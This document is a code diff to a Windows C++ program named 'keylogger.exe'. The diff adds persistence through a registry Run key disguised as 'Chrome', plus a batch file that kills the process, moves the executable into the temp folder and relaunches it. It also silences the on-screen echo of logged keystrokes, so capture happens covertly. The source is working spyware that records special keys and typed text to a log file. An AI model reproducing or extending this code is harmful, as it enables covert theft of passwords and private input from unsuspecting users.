@@ -1,4 +1,3 @@
-
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
 #include <stdlib.h>
@@ -8,8 +7,9 @@
 #include <sstream>
 #include <tchar.h>
 #include <Lmcons.h>
+#include <iostream>
 
-
+const std::string exe_name = "keylogger.exe";
 
 
 #pragma warning(disable : 4996)
@@ -19,6 +19,49 @@ bool test = 1;
 bool wymaganie = 1;
 
 using namespace std;
+
+
+inline bool filexits(const std::string& name) {
+	struct stat buffer;
+	return (stat(name.c_str(), &buffer) == 0);
+}
+
+
+
+void autostart() {
+	char username[UNLEN + 1];
+	DWORD username_len = UNLEN + 1;
+	GetUserName(username, &username_len);
+	
+	char letter[UNLEN + 1];
+	GetSystemDirectory(letter, sizeof(letter));
+
+	string cmd;
+	cmd = letter[0];
+	cmd += ":\\Users\\";
+	cmd += username;
+	cmd += "\\AppData\\Local\\Temp\\";
+	cmd += exe_name;
+	if (!filexits(cmd.c_str())) {
+		
+		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd;
+		system(cmd2.c_str());
+
+
+
+		fstream file;
+		file.open("temp.bat", ios::out);
+		file << "taskkill /IM " + exe_name + " /F\n";
+		file << "move " + exe_name + " %temp%\n";
+		file << "start  %temp%\\"+ exe_name;
+		file << "\nexit";
+		system("start temp.bat");
+
+
+	}
+
+
+}
 
 
 void LOG(string input) {
@@ -34,59 +77,59 @@ void LOG(string input) {
 bool SpecialKeys(int S_Key) {
 	switch (S_Key) {
 	case VK_SPACE:
-		cout << "$SPACE#";
+		//cout << "$SPACE#";
 		LOG(" ");
 		return true;
 	case VK_RETURN:
-		cout << "\n";
+	//	cout << "\n";
 		LOG("\n");
 		return true;
-	case '¾':
-		cout << ".";
+	case '.':
+    //cout << ".";
 		LOG(".");
 		return true;
 	case VK_SHIFT:
-		cout << "#SHIFT# ";
+	//	cout << "#SHIFT# ";
 		LOG(" #SHIFT# ");
 		return true;
 	case VK_BACK:
-		cout << " #BACKSPACE# ";
+	//	cout << " #BACKSPACE# ";
 		LOG(" #BACKSPACE# ");
 		return true;
 	case VK_RBUTTON:
-		cout << " #R_CLICK# ";
+	//	cout << " #R_CLICK# ";
 		LOG(" #R_CLICK# ");
 		return true;
 	case VK_CAPITAL:
-		cout << " #CAPS_LOCK# ";
+	//	cout << " #CAPS_LOCK# ";
 		LOG(" #CAPS_LOCK# ");
 		return true;
 	case VK_TAB:
-		cout << "#TAB#";
+	//	cout << "#TAB#";
 		LOG(" #TAB# ");
 		return true;
 	case VK_UP:
-		cout << "#UP#";
+	//	cout << "#UP#";
 		LOG(" #UP_ARROW# ");
 		return true;
 	case VK_DOWN:
-		cout << "#DOWN#";
+	//	cout << "#DOWN#";
 		LOG(" #DOWN_ARROW# ");
 		return true;
 	case VK_LEFT:
-		cout << "#LEFT#";
+	//	cout << "#LEFT#";
 		LOG(" #LEFT_ARROW# ");
 		return true;
 	case VK_RIGHT:
-		cout << " #RIGHT# ";
+	//	cout << " #RIGHT# ";
 		LOG(" #RIGHT_ARROW# ");
 		return true;
 	case VK_CONTROL:
-		cout << "#CONTROL#";
+	//	cout << "#CONTROL#";
 		LOG(" #CONTROL_ARROW# ");
 		return true;
 	case VK_MENU:
-		cout << "#ALT#";
+	//	cout << "#ALT#";
 		LOG(" #ALT# ");
 		return true;
 	default:
@@ -99,7 +142,8 @@ bool SpecialKeys(int S_Key) {
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+	autostart();
 	fstream LogFile;
 	string jd;
 	string jd2;
@@ -167,4 +211,3 @@ int main()
 
 	return 0;
 }
-
